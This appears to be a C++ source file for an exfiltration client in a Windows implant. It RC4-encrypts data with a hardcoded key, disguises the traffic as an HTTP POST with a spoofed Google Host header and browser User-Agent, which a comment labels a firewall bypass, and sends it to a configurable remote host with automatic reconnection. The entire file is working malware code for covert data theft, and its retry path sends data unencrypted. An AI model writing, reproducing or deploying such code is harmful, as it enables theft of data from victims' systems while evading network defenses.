#include "exfil/tcp_client.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#include "crypto/rc4.hpp"

#pragma comment(lib, "ws2_32.lib")

TcpClient::TcpClient(const std::string& ipAddress, int port) : ip(ipAddress), port(port) {
    sock = INVALID_SOCKET;
    isConnected = false;
    encryption = nullptr;
    
    // Key: DEADBEEF...
    key = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

TcpClient::~TcpClient() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if(encryption) delete encryption;
    WSACleanup();
}

bool TcpClient::Connect() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
        sock = INVALID_SOCKET;
    }
    
    // Reset Encryption 
    if(encryption) delete encryption;
    encryption = new RC4(key);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if(getaddrinfo(ip.c_str(), std::to_string(port).c_str(), &hints, &res) != 0) return false;

    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) {
        freeaddrinfo(res);
        return false;
    }

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        closesocket(sock);
        sock = INVALID_SOCKET;
        freeaddrinfo(res);
        return false;
    }

    freeaddrinfo(res);
    isConnected = true;
    return true;
}

void TcpClient::SetTarget(const std::string& newIp, int newPort) {
    if(isConnected) {
        closesocket(sock);
        sock = INVALID_SOCKET;
        isConnected = false;
    }
    ip = newIp;
    port = newPort;
}

bool TcpClient::SendData(const std::string& data) {
    // 1. If not connected, try to connect
    if (!isConnected) {
        if (!Connect()) return false;
    }

    // 2. Encrypt
    std::string packet = data + "\n";
    std::string cipher = encryption->Encrypt(packet);
    
    // 3. Masquerade as HTTP (Firewall Bypass)
    std::string http = "POST /api/v1/log HTTP/1.1\r\n";
    http += "Host: www.google.com\r\n";
    http += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
    http += "Content-Type: application/octet-stream\r\n";
    http += "Content-Length: " + std::to_string(cipher.size()) + "\r\n";
    http += "\r\n";
    http += cipher;
    
    int sent = send(sock, http.c_str(), http.length(), 0);

    // 3. Handle Failure (Broken Pipe usually)
    if (sent == SOCKET_ERROR) {
        isConnected = false;
        
        // Retry ONCE
        if(Connect()) {
            send(sock, packet.c_str(), packet.length(), 0);
            return true;
        }
        return false;
    }

    return true;
}
